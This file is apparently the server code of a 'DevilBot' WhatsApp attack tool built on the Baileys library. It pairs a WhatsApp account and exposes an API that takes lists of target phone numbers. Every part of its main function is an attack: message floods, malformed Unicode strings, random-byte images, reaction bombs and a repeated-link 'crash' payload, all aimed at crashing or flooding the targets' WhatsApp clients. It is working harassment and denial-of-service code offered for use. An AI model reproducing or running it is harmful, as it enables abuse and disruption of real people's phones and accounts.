const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.static('public'));
app.use(express.json());

const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const store = makeInMemoryStore({ logger: pino({ level: 'silent' }) });

let sock = null;
let isConnected = false;
let pairingCode = null;
let deviceName = 'DevilBot';

// ============================================
// WHATSAPP CONNECTION VIA PAIRING CODE
// ============================================
async function connectWhatsApp(pairingNumber = null) {
    const { state, saveCreds } = await useMultiFileAuthState('sessions');
    
    sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['DevilBot', 'Chrome', '120.0.0.0']
    });

    store.bind(sock.ev);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            // Fallback QR jika pairing gagal
            io.emit('qr', qr);
        }

        if (connection === 'open') {
            isConnected = true;
            console.log('🔥 WhatsApp Connected!');
            io.emit('status', 'connected');
            io.emit('message', '🔥 Devil Bot Connected!');
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('🔄 Reconnecting...');
                setTimeout(() => connectWhatsApp(pairingNumber), 3000);
            } else {
                isConnected = false;
                io.emit('status', 'disconnected');
                io.emit('message', '💀 Disconnected. Please re-pair.');
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);

    // === PAIRING CODE LOGIC ===
    if (pairingNumber) {
        try {
            const number = pairingNumber.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(number);
            pairingCode = code;
            console.log(`📱 Pairing Code: ${code}`);
            io.emit('pairing_code', code);
            io.emit('message', `📱 Pairing Code: ${code}`);
        } catch (error) {
            console.error('Pairing failed:', error);
            io.emit('message', '❌ Pairing failed. Check number.');
        }
    }

    return sock;
}

// ============================================
// ULTIMATE BRUTAL BUG FUNCTION
// ============================================
async function sendDevilMessage(targetNumber, type = 'ultimate') {
    if (!sock || !isConnected) {
        throw new Error('WhatsApp not connected');
    }

    const formattedNumber = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    const results = [];

    // === PAYLOAD BRUTAL ===
    const payloads = {
        ultimate: async () => {
            // Flood + Unicode + Reaction + Corrupt
            for (let i = 0; i < 30; i++) {
                await sock.sendMessage(formattedNumber, {
                    text: `☠️ DEVIL BUG ${i} ☠️ `.repeat(100)
                }).catch(() => {});
            }

            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(formattedNumber, {
                    text: '\uD800'.repeat(5000)
                }).catch(() => {});
            }

            for (let i = 0; i < 15; i++) {
                const corrupt = Buffer.alloc(1024 * 512);
                for (let j = 0; j < corrupt.length; j++) {
                    corrupt[j] = Math.floor(Math.random() * 256);
                }
                await sock.sendMessage(formattedNumber, {
                    image: corrupt,
                    caption: `🔥 DEVIL CORRUPT ${i} 🔥`
                }).catch(() => {});
            }

            // Reaction bomb
            const dummy = await sock.sendMessage(formattedNumber, { text: '☠️ TARGET ☠️' });
            const emojis = ['🔥', '💀', '👿', '⚡', '🌀'];
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(formattedNumber, {
                    react: { text: emojis[i % emojis.length], key: dummy.key }
                }).catch(() => {});
            }
        },
        crash: async () => {
            await sock.sendMessage(formattedNumber, {
                text: 'https://wa.me/settings\n'.repeat(200)
            });
        },
        flood: async () => {
            for (let i = 0; i < 100; i++) {
                await sock.sendMessage(formattedNumber, {
                    text: `💀 DEVIL SPAM ${i} `.repeat(50)
                });
            }
        }
    };

    const payload = payloads[type] || payloads.ultimate;
    await payload();

    return { success: true, message: `Devil attack sent to ${targetNumber}` };
}

// ============================================
// API ROUTES
// ============================================
app.post('/api/send-devil', async (req, res) => {
    const { numbers, type } = req.body;
    
    if (!numbers) {
        return res.status(400).json({ error: 'Nomor target required' });
    }

    const numberList = Array.isArray(numbers) ? numbers : numbers.split(',').map(n => n.trim());
    const results = [];

    for (const number of numberList) {
        const result = await sendDevilMessage(number, type || 'ultimate');
        results.push({ number, ...result });
        await new Promise(r => setTimeout(r, 1500));
    }

    io.emit('log', { results });
    res.json({ results });
});

app.post('/api/pair', async (req, res) => {
    const { number } = req.body;
    if (!number) {
        return res.status(400).json({ error: 'Number required' });
    }

    try {
        await connectWhatsApp(number);
        res.json({ success: true, message: 'Pairing initiated' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/status', (req, res) => {
    res.json({ connected: isConnected });
});

// ============================================
// START SERVER (Local)
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🔥 Devil Server running at http://localhost:${PORT}`);
    console.log('💀 Connect via Pairing Code (no QR)');
    
    // Auto-pair if number in .env
    if (process.env.PAIRING_NUMBER) {
        setTimeout(() => {
            connectWhatsApp(process.env.PAIRING_NUMBER);
        }, 1000);
    }
});
